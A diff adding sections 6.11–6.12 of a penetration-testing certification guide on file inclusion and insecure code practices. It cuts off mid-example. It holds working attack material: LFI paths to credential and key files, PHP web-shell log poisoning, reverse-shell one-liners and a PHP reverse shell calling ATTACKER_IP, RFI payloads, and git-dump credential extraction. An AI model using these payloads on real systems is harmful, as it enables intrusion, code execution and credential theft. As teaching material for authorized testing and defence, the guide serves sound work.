@@ -18375,6 +18375,1607 @@ During every web application assessment:
 
 ---
 
-*— Sections 6.7, 6.8, 6.9, and 6.10 are complete. Module 6 continues with Section 6.11: Exploiting File Inclusion Vulnerabilities, 6.12: Exploiting Insecure Code Practices, and 6.13: Summary. —*
+*— Sections 6.7, 6.8, 6.9, and 6.10 are complete.  —*
 
 ---
+# Module 6 — Sections 6.11, 6.12, and 6.13
+
+> **CompTIA PenTest+ / Ethical Hacking Certification Series**
+> *Professional Reference Guide — GitHub Edition*
+> *File Inclusion · Insecure Code Practices · Race Conditions · APIs · Module Summary*
+
+---
+
+## Table of Contents
+
+- [6.11 Exploiting File Inclusion Vulnerabilities](#611-exploiting-file-inclusion-vulnerabilities)
+  - [6.11.1 Overview — What File Inclusion Is and Why It Leads to RCE](#6111-overview--what-file-inclusion-is-and-why-it-leads-to-rce)
+  - [6.11.2 Local File Inclusion (LFI) — The Complete Attack Chain](#6112-local-file-inclusion-lfi--the-complete-attack-chain)
+  - [6.11.3 Remote File Inclusion (RFI) — Serving Your Own Code to the Server](#6113-remote-file-inclusion-rfi--serving-your-own-code-to-the-server)
+- [6.12 Exploiting Insecure Code Practices](#612-exploiting-insecure-code-practices)
+  - [6.12.1 Overview — The Code Quality → Security Relationship](#6121-overview--the-code-quality--security-relationship)
+  - [6.12.2 Comments in Source Code](#6122-comments-in-source-code)
+  - [6.12.3 Lack of Error Handling and Overly Verbose Error Handling](#6123-lack-of-error-handling-and-overly-verbose-error-handling)
+  - [6.12.4 Hard-Coded Credentials](#6124-hard-coded-credentials)
+  - [6.12.5 Race Conditions](#6125-race-conditions)
+  - [6.12.6 Unprotected APIs](#6126-unprotected-apis)
+  - [6.12.7 Hidden Elements and Client-Side Controls](#6127-hidden-elements-and-client-side-controls)
+  - [6.12.8 Lack of Code Signing](#6128-lack-of-code-signing)
+  - [6.12.9 Additional Web Application Hacking Tools](#6129-additional-web-application-hacking-tools)
+  - [6.12.10 The OWASP Web Security Testing Guide](#61210-the-owasp-web-security-testing-guide)
+- [6.13 Module 6 Summary — The Complete Web Application Security Picture](#613-module-6-summary--the-complete-web-application-security-picture)
+
+---
+
+## 6.11 Exploiting File Inclusion Vulnerabilities
+
+### 6.11.1 Overview — What File Inclusion Is and Why It Leads to RCE
+
+#### The Core Concept
+
+File inclusion vulnerabilities occur in applications that dynamically include files based on user-controlled input. The mechanism is most commonly found in PHP applications, where the language provides `include()`, `require()`, `include_once()`, and `require_once()` functions to insert one PHP file's contents into another during execution.
+
+The typical use case looks benign: a developer wants to load different page templates or modules based on user navigation:
+
+```php
+// A common PHP template system pattern:
+$page = $_GET['page'];
+include($page . '.php');
+```
+
+When the user visits `?page=home`, the server includes `home.php`. When they visit `?page=about`, it includes `about.php`. This pattern is convenient for developers who want modular, template-driven applications.
+
+The problem: there is no validation that the `page` parameter must be one of the intended values. An attacker can supply any value — a path to a sensitive file on the server, a URL pointing to a malicious script, or a traversal sequence that reads system files. The server executes whatever it includes.
+
+File inclusion differs from simple directory traversal (Section 6.10) in a critical way: **directory traversal reads files and returns their contents as text. File inclusion executes files as PHP code.** When a file is included via PHP's include function, its contents are parsed and executed by the PHP interpreter. This transforms a sensitive file read into potential Remote Code Execution.
+
+The distinction:
+- Directory traversal: attacker reads `/etc/passwd` — sees user accounts
+- Local File Inclusion: attacker includes `/etc/passwd` — PHP tries to execute its contents as PHP code (no execution result from this file, but demonstrates the mechanism)
+- Local File Inclusion with code injection: attacker injects PHP code into a server log file, then includes that log file — **full code execution**
+
+This escalation path — from file read to log poisoning to Remote Code Execution — is one of the most powerful attack chains in web application exploitation.
+
+---
+
+### 6.11.2 Local File Inclusion (LFI) — The Complete Attack Chain
+
+#### Understanding LFI
+
+Local File Inclusion (LFI) is when the file to be included exists on the same server as the application. The attacker cannot directly specify a remote URL but can traverse the local file system to include any readable file.
+
+**Vulnerable code:**
+```php
+<?php
+$page = $_GET['page'];
+include('/var/www/html/pages/' . $page . '.php');
+?>
+```
+
+The developer assumes the user will only provide simple filenames like `home`, `about`, `contact`. The `.php` extension is appended automatically.
+
+**Basic LFI test:**
+```
+?page=../../../etc/passwd
+```
+This resolves to: `/var/www/html/pages/../../../etc/passwd.php`
+
+Wait — the `.php` extension is appended. `/etc/passwd.php` does not exist. The developer thought appending `.php` would prevent LFI. This is a partial mitigation that historically had bypasses.
+
+**Bypassing the .php extension append:**
+
+*Null byte injection (PHP < 5.3.4):*
+```
+?page=../../../etc/passwd%00
+```
+PHP's `include()` treated the null byte as string termination. The path became `/etc/passwd\x00.php` — the `\x00` terminated the string before `.php` was added. This bypass is patched in all modern PHP versions.
+
+*Path truncation (older PHP versions):*
+Very long path strings caused PHP to truncate the path at a certain length, dropping the `.php` extension. Not effective in modern PHP.
+
+**Modern LFI without extension issues:**
+
+Many real-world LFI vulnerabilities do not append extensions:
+```php
+<?php
+$page = $_GET['page'];
+include($page);  // No extension appended
+?>
+```
+
+Or the developer uses a switch/case structure but has a default case that includes user input:
+```php
+<?php
+switch($_GET['page']) {
+    case 'home': include('home.php'); break;
+    case 'about': include('about.php'); break;
+    default: include($_GET['page']); // Fallthrough LFI!
+}
+?>
+```
+
+#### Phase 1 — Reconnaissance Through LFI
+
+Once LFI is confirmed, the first phase is intelligence gathering through reading sensitive files:
+
+**Linux — High-Value Targets:**
+
+```
+# User accounts and system users:
+?page=../../../etc/passwd
+
+# Password hashes (requires elevated privileges, but worth trying):
+?page=../../../etc/shadow
+
+# Internal network mapping:
+?page=../../../etc/hosts
+
+# Kernel and distribution information:
+?page=../../../proc/version
+?page=../../../proc/sys/kernel/hostname
+
+# Network interfaces and connections:
+?page=../../../proc/net/dev          # Network interfaces
+?page=../../../proc/net/tcp          # Active TCP connections (hex encoded)
+?page=../../../proc/net/tcp6         # IPv6 TCP connections
+
+# Web server process environment (contains credentials and tokens):
+?page=../../../proc/self/environ
+
+# Web server command line (reveals binary and arguments):
+?page=../../../proc/self/cmdline
+
+# File descriptors (reveals open files):
+?page=../../../proc/self/fd/0
+?page=../../../proc/self/fd/1
+?page=../../../proc/self/fd/2
+
+# Apache web server configuration:
+?page=../../../etc/apache2/apache2.conf
+?page=../../../etc/apache2/sites-enabled/000-default.conf
+?page=../../../etc/apache2/sites-available/default-ssl.conf
+
+# Nginx configuration:
+?page=../../../etc/nginx/nginx.conf
+?page=../../../etc/nginx/sites-enabled/default
+
+# SSH configuration and keys (if web server runs as privileged user):
+?page=../../../root/.ssh/id_rsa
+?page=../../../root/.ssh/authorized_keys
+?page=../../../home/www-data/.ssh/id_rsa
+
+# Cron jobs (automated scripts, often with credentials):
+?page=../../../etc/crontab
+?page=../../../var/spool/cron/crontabs/root
+
+# Log files (critical for next phase — log poisoning):
+?page=../../../var/log/apache2/access.log
+?page=../../../var/log/apache2/error.log
+?page=../../../var/log/nginx/access.log
+?page=../../../var/log/auth.log
+?page=../../../var/log/syslog
+
+# Application-specific configuration:
+?page=../../../var/www/html/config.php
+?page=../../../var/www/html/.env
+?page=../../../var/www/html/wp-config.php         # WordPress
+?page=../../../var/www/html/configuration.php     # Joomla
+?page=../../../var/www/html/app/config/database.php
+```
+
+**Windows — High-Value Targets:**
+```
+?page=..\..\..\Windows\System32\drivers\etc\hosts
+?page=..\..\..\Windows\win.ini
+?page=..\..\..\Windows\System32\config\SAM         # (locked while running)
+?page=..\..\..\inetpub\logs\LogFiles\W3SVC1\u_ex*.log  # IIS logs
+?page=..\..\..\xampp\apache\conf\httpd.conf
+?page=..\..\..\xampp\FileZillaFTP\FileZilla Server.xml  # FTP credentials
+?page=C:\inetpub\wwwroot\web.config                 # IIS config
+```
+
+#### Phase 2 — Escalation to Remote Code Execution via Log Poisoning
+
+Log poisoning is the most commonly successful LFI-to-RCE technique. It exploits the fact that web servers log request data — including the User-Agent header, the request URL, and parameters — and that PHP's include function executes any PHP code found in the included file.
+
+**The attack chain:**
+
+**Step 1:** Confirm that LFI can read the Apache/Nginx access log:
+```
+?page=../../../var/log/apache2/access.log
+```
+If the access log contents appear in the response, the attack is possible.
+
+**Step 2:** Inject PHP code into the access log via a crafted HTTP request.
+
+The web server logs the User-Agent header from every request. If you send a request with a PHP web shell as the User-Agent, that PHP code is written into the log:
+
+```bash
+# Using curl to inject PHP code into the User-Agent:
+curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
+
+# What gets written to /var/log/apache2/access.log:
+# 192.168.1.50 - - [15/Jul/2026:10:30:00 +0000] "GET / HTTP/1.1" 200 1234 
+# "-" "<?php system($_GET['cmd']); ?>"
+```
+
+**Step 3:** Include the log file via LFI to trigger PHP execution:
+```
+?page=../../../var/log/apache2/access.log&cmd=id
+```
+
+The PHP interpreter includes the log file, parses all content, finds the injected `<?php system($_GET['cmd']); ?>`, executes it with `cmd=id`, and the output appears in the response:
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+You now have Remote Code Execution. From here, the path to a reverse shell is straightforward:
+
+```bash
+# Get a reverse shell via the LFI+log poisoning RCE:
+
+# 1. Start a listener on your attack machine:
+nc -lvnp 4444
+
+# 2. Execute a reverse shell via the cmd parameter:
+?page=../../../var/log/apache2/access.log&cmd=bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261
+
+# URL decoded command: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+```
+
+#### Phase 3 — Alternative LFI-to-RCE Paths
+
+When log poisoning fails (log file not accessible, log file too large to include, log path unknown), several alternative paths exist:
+
+**Via /proc/self/environ:**
+```bash
+# Inject PHP into environment via User-Agent:
+curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
+
+# Include the environment file:
+?page=../../../proc/self/environ&cmd=id
+
+# The environment file contains the User-Agent (HTTP_USER_AGENT variable)
+# When included, PHP executes the injected code
+```
+
+**Via PHP session files:**
+
+PHP stores session data in files like `/tmp/sess_[PHPSESSID]`. If you can inject PHP code into your session data and then include the session file via LFI:
+
+```php
+// Step 1: Create a session with PHP code injection
+// Visit a page that stores user input in the session:
+// username = <?php system($_GET['cmd']); ?>
+
+// Step 2: Get your PHPSESSID from the cookie (e.g., abc123)
+
+// Step 3: Include your session file:
+// ?page=../../../tmp/sess_abc123&cmd=id
+```
+
+**Via PHP wrappers (when include path is controlled):**
+
+PHP stream wrappers allow treating streams as if they were files. The `php://` wrapper is particularly powerful for LFI exploitation:
+
+```
+# php://filter — read file contents with Base64 encoding (avoids PHP execution):
+?page=php://filter/convert.base64-encode/resource=config.php
+
+# This returns the Base64-encoded source code of config.php
+# without executing it — allows reading PHP file contents directly
+# Decode the output: echo "BASE64_OUTPUT" | base64 -d
+
+# php://input — include the HTTP request body as PHP code:
+?page=php://input
+# With POST body containing: <?php system('id'); ?>
+
+# data:// wrapper — include a data URI as PHP code:
+?page=data://text/plain,<?php system('id')?>
+?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpPz4=
+# (Base64 of: <?php system('id')?>)
+
+# zip:// and phar:// wrappers (for file upload + include chains):
+# Upload a PHP web shell inside a ZIP file with a .jpg extension
+# If file uploads are allowed but PHP is blocked by extension:
+# zip://path/to/upload.jpg#shell.php
+```
+
+**The php://filter wrapper deserves special attention:**
+
+```bash
+# Read any PHP file's source code without execution:
+?page=php://filter/read=convert.base64-encode/resource=index.php
+?page=php://filter/read=convert.base64-encode/resource=config.php
+?page=php://filter/read=convert.base64-encode/resource=../../../etc/passwd
+
+# Multiple filter chaining:
+?page=php://filter/read=string.rot13|convert.base64-encode/resource=config.php
+
+# Decode the output on your machine:
+echo "BASE64_HERE" | base64 -d
+```
+
+This is extremely powerful: it lets you read the source code of all PHP files in the application — revealing database credentials, API keys, business logic, and other vulnerabilities without triggering any code execution.
+
+#### LFI Testing Methodology
+
+```bash
+# Automated LFI testing with ffuf:
+ffuf -u "http://target.com/page?file=FUZZ" \
+  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
+  -fw 15 \
+  -mc 200
+
+# Manual testing sequence:
+# 1. Confirm basic traversal:
+curl "http://target.com/page?file=../../../etc/passwd"
+
+# 2. Try wrapper-based reading (no execution):
+curl "http://target.com/page?file=php://filter/read=convert.base64-encode/resource=index"
+# Decode: echo "OUTPUT" | base64 -d
+
+# 3. Test log file access:
+curl "http://target.com/page?file=../../../var/log/apache2/access.log"
+
+# 4. If log accessible: inject PHP via User-Agent:
+curl -A '<?php system($_GET["cmd"]); ?>' "http://target.com/"
+
+# 5. Execute code via log inclusion:
+curl "http://target.com/page?file=../../../var/log/apache2/access.log&cmd=id"
+
+# 6. Get reverse shell:
+# Set up listener: nc -lvnp 4444
+curl "http://target.com/page?file=../../../var/log/apache2/access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'"
+```
+
+---
+
+### 6.11.3 Remote File Inclusion (RFI) — Serving Your Own Code to the Server
+
+#### What Makes RFI Different — And More Directly Dangerous
+
+Remote File Inclusion is LFI's more immediately dangerous sibling. Instead of including a local file (which requires a secondary step to inject code into that file), RFI allows the attacker to include a file hosted on an attacker-controlled remote server. The server fetches the URL and executes whatever PHP code it finds there.
+
+This eliminates the need for any pre-injection step. If RFI is possible, Remote Code Execution is immediate.
+
+**PHP configuration requirements:**
+
+RFI only works when two PHP configuration directives are set:
+- `allow_url_fopen = On` — allows using URLs in file functions
+- `allow_url_include = On` — allows using URLs in include/require functions
+
+`allow_url_include` has been `Off` by default since PHP 5.2.0. This significantly limits RFI in modern deployments. However:
+- Legacy applications may have explicitly enabled these settings
+- Hosting providers that configure PHP permissively may have them enabled
+- Some application frameworks or deployment scripts re-enable them
+
+**Checking whether RFI is enabled:**
+```bash
+# Test with a URL that logs access:
+?page=http://your-burp-collaborator.burpcollaborator.net/test
+
+# If you receive an HTTP request in Collaborator → allow_url_include is On → RFI possible
+```
+
+#### RFI Exploitation — From Discovery to Shell
+
+**Step 1: Prepare your malicious PHP file**
+
+Create a PHP web shell or reverse shell on your attack server:
+
+```php
+<?php
+// Simple web shell — receives commands via GET parameter:
+if(isset($_GET['cmd'])) {
+    echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';
+}
+?>
+```
+
+Or a full reverse shell PHP file:
+```php
+<?php
+// PHP reverse shell (simplified):
+$ip = 'ATTACKER_IP';
+$port = 4444;
+$sock = fsockopen($ip, $port);
+$proc = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
+?>
+```
+
+**Step 2: Host your malicious file**
+
+```bash
+# Start a simple HTTP server on Kali:
+python3 -m http.server 8000
+
+# Or use PHP's built-in server:
+php -S 0.0.0.0:8000
+
+# Using ngrok to make it accessible over the internet:
+ngrok http 8000
+```
+
+**Step 3: Include your remote file via the vulnerable parameter**
+
+```
+# Basic RFI:
+?page=http://ATTACKER_IP:8000/shell.php
+
+# With command execution:
+?page=http://ATTACKER_IP:8000/webshell.php&cmd=id
+
+# If the application appends .php to your input:
+# Host a file without extension: shell
+# The application constructs: http://ATTACKER_IP:8000/shell.php → your shell executes
+
+# Using HTTPS:
+?page=https://ATTACKER_IP:8443/shell.php
+
+# Using FTP (if allow_url_fopen is on but http is blocked):
+?page=ftp://ATTACKER_IP/shell.php
+```
+
+**Step 4: Receive the reverse shell**
+
+```bash
+# Start listener before triggering the RFI:
+nc -lvnp 4444
+
+# Trigger RFI with reverse shell PHP:
+curl "http://target.com/page?page=http://ATTACKER_IP:8000/revshell.php"
+
+# Shell appears in listener window
+```
+
+#### RFI with Obfuscation and WAF Bypass
+
+```
+# Null byte to bypass extension appending:
+?page=http://ATTACKER_IP:8000/shell%00
+
+# Double encoding:
+?page=http%3A%2F%2FATTACKER_IP%3A8000%2Fshell.php
+
+# Using alternative protocols:
+?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+# (Base64 of: <?php system($_GET['cmd']); ?>)
+# This is technically a wrapper-based inclusion, not remote, but achieves same result
+
+# If HTTP is blocked but FTP is not:
+?page=ftp://ATTACKER_IP/shell.php
+
+# Using SMB (Windows targets):
+?page=\\ATTACKER_IP\share\shell.php
+```
+
+#### Differences Between LFI and RFI — Side by Side
+
+| Aspect | LFI | RFI |
+|--------|-----|-----|
+| File location | Same server (local) | Remote attacker-controlled server |
+| PHP requirements | Always works if include() used | Requires `allow_url_include = On` |
+| Direct RCE | No (requires chaining) | Yes (immediate) |
+| Prerequisites | None | allow_url_include enabled |
+| Modern prevalence | Common | Less common (PHP disabled by default) |
+| Stealth | Reads local files (may trigger file audit logs) | Makes outbound HTTP request (detectable in outbound logs) |
+| Key bypass technique | Log poisoning, wrapper abuse | Hosting malicious file remotely |
+
+#### Defending Against File Inclusion
+
+**Primary defense — Never use user input in include/require:**
+```php
+// SECURE: whitelist approach
+$allowed_pages = ['home', 'about', 'contact', 'products'];
+$page = $_GET['page'];
+
+if (!in_array($page, $allowed_pages)) {
+    include('404.php');
+    exit();
+}
+
+include($page . '.php');
+```
+
+**Configuration hardening:**
+```ini
+; php.ini — disable remote inclusion:
+allow_url_fopen = Off
+allow_url_include = Off
+
+; Disable dangerous PHP wrappers:
+; (Use Suhosin PHP extension for this)
+
+; Restrict file operations to web root:
+open_basedir = /var/www/html:/tmp
+```
+
+---
+
+## 6.12 Exploiting Insecure Code Practices
+
+### 6.12.1 Overview — The Code Quality → Security Relationship
+
+There is a consistent pattern in web application security: the applications with the most severe vulnerabilities are also the applications with the poorest overall code quality. This is not coincidental — it reflects the same underlying engineering discipline (or lack thereof).
+
+An application where developers write verbose debug comments in production code is also likely to have inadequate input validation. An application with hard-coded credentials is also likely to have authorization checks as an afterthought. Poor engineering discipline manifests consistently across all dimensions of code quality.
+
+Section 6.12 addresses the class of vulnerabilities that stem directly from insecure coding habits — practices that no security-aware developer should follow, yet which appear persistently in production applications because they are convenient, because the team prioritized shipping over security, or because the security implications were never understood.
+
+These are also among the most immediately impactful findings in a penetration test, because they often require no sophisticated attack technique — they require only observation. Reading HTML source code, triggering an error, or examining an API response can reveal credentials, system architecture, and exploitable logic flaws that sophisticated attackers would spend days attempting to discover through more technical means.
+
+---
+
+### 6.12.2 Comments in Source Code
+
+#### The Problem — Development Artifacts Left in Production
+
+Comments are a normal and valuable part of software development. They explain why a function works the way it does, document parameters, and communicate between developers. The problem is when sensitive information is left in comments that become part of the output — visible to anyone who views the page source.
+
+In HTML and JavaScript that is delivered to the browser, every comment is readable by any user who opens the browser's developer tools or views the page source. Developers often leave comments from the development process — test credentials, internal endpoint paths, business logic notes, debugging information — without considering that this code will be delivered to potentially hostile clients.
+
+**What to look for in HTML comments:**
+
+```html
+<!-- TODO: Remove test credentials before deployment: admin/Test123! -->
+<!-- Dev endpoint: /api/v2/internal/admin-override -->
+<!-- This form bypasses auth for legacy compatibility - fix after launch -->
+<!-- Database: prod-db-01.corp.local:3306, user: webapp, pass: Pr0d_DB_2024! -->
+<!-- NOTE: Skip validation if is_admin cookie is set to 1 -->
+<!-- AWS key: AKIAIOSFODNN7EXAMPLE, secret: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY -->
+```
+
+Every one of these examples is representative of real findings from real penetration tests. The pattern is so consistent that viewing source code and HTML comments is one of the first things a professional web application tester does on any target.
+
+**JavaScript files are even richer:**
+
+JavaScript is delivered in full to the browser — including all function implementations, all internal endpoint paths used by the application's AJAX calls, and any comments or dead code:
+
+```javascript
+// OLD ADMIN ENDPOINT - DO NOT USE IN PROD (but left for backward compat)
+// GET /api/v1/superadmin/users returns all users without auth check
+var adminEndpoint = '/api/v1/superadmin/users';
+
+// Test credentials: testuser@example.com / T3st_p@ssword
+// TODO: Remove before going live
+
+function debugMode() {
+    // This function disables CSRF checking for testing
+    // Called by: if (location.hash === '#debug') enableDebug();
+}
+```
+
+That last comment is extraordinary in a real application: it reveals that navigating to `https://target.com/#debug` calls a function that disables CSRF protection. A complete CSRF defense is broken by a hidden debug feature, revealed through a comment.
+
+**Systematic JavaScript comment mining:**
+
+```bash
+# Download all JavaScript files from a site and search for sensitive patterns:
+# 1. From Burp: Site Map → right-click target → "Copy URLs in scope"
+# 2. Use wget to mirror the site's JS files:
+wget -r -l2 -A.js https://target.com -P /tmp/js_files/
+
+# 3. Search for sensitive patterns:
+grep -rn "TODO\|FIXME\|password\|passwd\|secret\|key\|token\|api\|endpoint\|admin\|debug\|test\|staging" \
+  /tmp/js_files/ --include="*.js" -i
+
+# 4. Look for commented-out HTML endpoints:
+grep -rn "<!--\|http://\|/api/\|/admin\|/internal" /tmp/js_files/
+
+# Tools for automated secret detection in JavaScript:
+# trufflehog (works on URLs too):
+trufflehog filesystem /tmp/js_files/
+
+# secretlint:
+secretlint /tmp/js_files/**/*.js
+
+# jsfinder - finds endpoints and secrets in JS:
+python3 jsfinder.py -i https://target.com -r
+```
+
+**Endpoint discovery from JavaScript:**
+
+Modern Single-Page Applications (SPAs) built with React, Vue, or Angular bundle all their JavaScript into one or a few large files. These files contain every API endpoint the application uses. By extracting these endpoints, you build a complete map of the application's API surface — including endpoints that may not be accessible through the UI:
+
+```bash
+# LinkFinder - extract endpoints from JavaScript files:
+python3 linkfinder.py -i https://target.com -d -o cli
+
+# Or target a specific JS file:
+python3 linkfinder.py -i https://target.com/static/app.bundle.js -o cli
+
+# Manually in browser: open DevTools → Sources → search for API patterns
+# Search for: /api/, fetch(, XMLHttpRequest, $.ajax, axios.get
+```
+
+---
+
+### 6.12.3 Lack of Error Handling and Overly Verbose Error Handling
+
+#### Why Error Messages Are a Reconnaissance Goldmine
+
+When an application encounters an unexpected condition — an invalid database query, a malformed request, a missing required parameter — it must decide what to tell the user. The secure answer is: very little. "Something went wrong. Please try again." The common answer in development-mode or poorly configured production applications is: everything.
+
+A verbose error message is simultaneously a sign of poor code quality and an intelligence asset for an attacker. A single stack trace can reveal:
+- The programming language and runtime version
+- The web framework and its version
+- The database system and version
+- The server-side file structure
+- The internal class and method names
+- The exact query that failed (exposing table names, column names, and query logic)
+- Internal IP addresses and hostnames
+- Configuration values that leaked into the error context
+
+**What different error types reveal:**
+
+**PHP errors:**
+```
+Fatal error: Uncaught PDOException: SQLSTATE[42000]: 
+Syntax error or access violation: 
+1064 You have an error in your SQL syntax; 
+check the manual that corresponds to your MySQL 8.0.33 server
+for the right syntax to use near '''' at line 1
+
+in /var/www/html/application/models/UserModel.php:142
+Stack trace:
+#0 /var/www/html/application/models/UserModel.php(142): PDO->query()
+#1 /var/www/html/application/controllers/AuthController.php(67): UserModel->getUser()
+```
+
+This single error reveals: MySQL 8.0.33, the database type is MySQL, the file system path is `/var/www/html/`, the application has `models/` and `controllers/` directories, the authentication controller is `AuthController.php`, and the user retrieval method is `getUser()` — plus a SQL syntax error that confirms SQL injection is possible.
+
+**Python/Django errors:**
+```
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/app/views.py", line 23, in profile_view
+    user = User.objects.get(username=request.GET['user'])
+django.contrib.auth.models.User.DoesNotExist: User matching query does not exist.
+
+Request Method: GET
+Request URL: https://target.com/profile/?user=alice
+Django Version: 3.2.15
+Exception Type: DoesNotExist
+Python Version: 3.10.4
+Server time: Wed, 15 Jul 2026 10:30:00 +0000
+```
+
+Django version 3.2.15. Python 3.10.4. The source code line `User.objects.get(username=request.GET['user'])` is shown — directly revealing the query structure for user lookup and confirming the parameter name.
+
+**Java/Spring stack traces:**
+```
+java.lang.NullPointerException: Cannot invoke 
+"com.targetapp.models.User.getEmail()" because "user" is null
+	at com.targetapp.controllers.AccountController.updateProfile(AccountController.java:145)
+	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+	...
+
+Caused by: org.springframework.dao.EmptyResultDataAccessException: 
+Incorrect result size: expected 1, actual 0
+```
+
+Reveals: Java Spring framework, package structure (`com.targetapp`), controller name (`AccountController`), database interaction pattern.
+
+#### Provoking Informative Errors
+
+A key penetration testing technique is deliberately triggering errors to extract information:
+
+```bash
+# SQL syntax errors (to confirm SQLi and learn database type):
+?id='
+?id=1'
+?search=<
+
+# Type mismatch errors:
+?user_id=alice         # If expecting integer
+?page=99999999         # Out of range ID
+
+# Missing required parameters:
+# Remove parameters from POST requests to see validation errors
+
+# Malformed JSON/XML:
+# Send: {"user": invalid_json}
+# Or: <root><unclosed
+
+# Very long input:
+?name=AAAAAAAAAA...  # 10000+ characters
+
+# Special characters that break parsers:
+?param=../../etc/passwd    # Path traversal + error on some systems
+?param=null
+?param=undefined
+?param[]                   # Array-type parameter confusion
+
+# HTTP method mismatch:
+# Send DELETE to a route expecting GET
+# Send PUT to a route expecting POST
+
+# Content-Type mismatch:
+# Send JSON with Content-Type: application/xml
+# Send XML with Content-Type: application/json
+```
+
+**Checking for debug panels accidentally exposed in production:**
+
+```bash
+# Django debug mode endpoint:
+https://target.com/__debug__/
+
+# Laravel Telescope (debug dashboard):
+https://target.com/telescope
+
+# Flask debug console:
+https://target.com/console
+
+# Rails debug:
+https://target.com/rails/info/properties
+
+# PHP Xdebug listener (check for port 9000):
+# nmap scan: nmap -p 9000 target.com
+
+# Spring Boot Actuator endpoints (massive information disclosure):
+https://target.com/actuator
+https://target.com/actuator/health
+https://target.com/actuator/env          # Environment variables including credentials!
+https://target.com/actuator/beans        # All Spring beans
+https://target.com/actuator/mappings     # All URL mappings
+https://target.com/actuator/configprops  # All configuration properties
+https://target.com/actuator/loggers      # Logger configuration
+https://target.com/actuator/metrics      # Application metrics
+```
+
+Spring Boot Actuator's `/actuator/env` endpoint, when accessible without authentication, returns the complete application environment including database passwords, API keys, and all configuration values. This is a critical finding that is surprisingly common in cloud deployments.
+
+```bash
+# Nuclei checks for actuator exposure:
+nuclei -u https://target.com -id springboot-actuator
+nuclei -u https://target.com -tags springboot
+```
+
+---
+
+### 6.12.4 Hard-Coded Credentials
+
+#### The Problem — Credentials as Code
+
+Hard-coded credentials are authentication secrets embedded directly in source code rather than loaded from a secure configuration store. They appear in:
+- Database connection strings in application code
+- API keys in JavaScript files delivered to browsers
+- Cryptographic keys and secrets in source repositories
+- Default passwords in device firmware
+- Test credentials left in production code
+- Service account credentials in automation scripts
+
+The fundamental problem: code is shared, versioned, reviewed, committed, and often eventually made public. Credentials embedded in code inherit all these properties. When the code is committed to Git and pushed to a remote repository, the credentials are in the version history permanently — even if they are "deleted" in a subsequent commit. `git log` reveals all past states of the file.
+
+**Where hard-coded credentials appear in web applications:**
+
+```javascript
+// Client-side JavaScript (visible to ALL users):
+const apiKey = "OpenAI API key";  // OpenAI API key
+const stripeKey = "Stripe live key";  // Stripe live key
+const AWS_ACCESS_KEY = "AWS_ACCESS_KEY_";
+const AWS_SECRET_KEY = "AWS_ACCESS_KEY_";
+const dbPassword = "Pr0ductionDB_2024!";
+
+// In configuration files committed to version control:
+DATABASE_URL = "postgresql://app_user:Pr0d_DB_Password@prod-db.internal:5432/appdb"
+REDIS_URL = "redis://:redis_password@redis.internal:6379/0"
+SECRET_KEY = "django-insecure-change-this-before-deployment"  # Still in production
+JWT_SECRET = "mysecretkey"  # Literally "mysecretkey"
+```
+
+**Searching for hard-coded credentials:**
+
+```bash
+# In a codebase you have access to:
+grep -rn "password\|passwd\|secret\|api_key\|apikey\|access_key\|token" \
+  /var/www/html/ --include="*.php" --include="*.py" --include="*.js" \
+  --include="*.env" --include="*.conf" -i
+
+# Looking for specific patterns:
+grep -rn "DB_PASS\|DATABASE_PASSWORD\|DB_PASSWORD" /var/www/html/ -i
+grep -rn "AKIA[A-Z0-9]{16}" /var/www/html/  # AWS Access Key pattern
+grep -rn "sk_live_[a-zA-Z0-9]{24}" /var/www/html/  # Stripe Live Key pattern
+grep -rn "ghp_[a-zA-Z0-9]{36}" /var/www/html/  # GitHub Personal Access Token
+
+# trufflehog - automated secret scanning:
+trufflehog filesystem /var/www/html/
+
+# gitleaks - scan git repositories:
+gitleaks detect --source /path/to/repo
+
+# In public GitHub repositories:
+# GitHub advanced search: "password" language:PHP filename:config.php
+# GitHub code search API for organization:
+# https://api.github.com/search/code?q=org:targetco+password+filename:config
+```
+
+**The Git History Attack:**
+
+Even when developers realize they committed credentials and remove them in a subsequent commit, the credential remains in git history:
+
+```bash
+# If you have access to a .git directory (another finding in itself):
+# Download entire git history:
+git log --oneline
+git show [COMMIT_HASH]:path/to/config.php  # Show file at specific commit
+git diff HEAD~1 HEAD -- config.php         # Show what changed
+git log -p --follow -- config.php          # Full history of file
+
+# Tool: git-dumper (extract git repo from exposed .git directory):
+git-dumper http://target.com/.git /tmp/dumped_repo/
+
+# After dumping:
+cd /tmp/dumped_repo
+git log --all --oneline           # All commits
+git stash list                    # Any stashed changes
+git show stash@{0}                # Show stashed content (often dev credentials)
+
+# gitleaks on the dumped repository:
+gitleaks detect --source /tmp/dumped_repo --verbose
+```
+
+**The .env file:**
+
+The `.env` file is used by almost every modern web framework to store environment-specific configuration — database URLs, API keys, secrets, environment flags. It should never be accessible from the web, but when misconfigured it is a complete credential dump:
+
+```bash
+# Test if .env is accessible:
+curl https://target.com/.env
+
+# Example of what a found .env looks like:
+APP_KEY=base64:NbqGfCVBMuIJlQxCJjJfGzxPRGfDHXkVaGKBsTmrUa4=
+DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+DB_PORT=3306
+DB_DATABASE=laravel_production
+DB_USERNAME=laravel_user
+DB_PASSWORD=Pr0d_DB_P@ssword!
+
+AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+AWS_DEFAULT_REGION=us-east-1
+
+STRIPE_SECRET_KEY=STRIPE_SECRET_KEY=fake_STRIPE
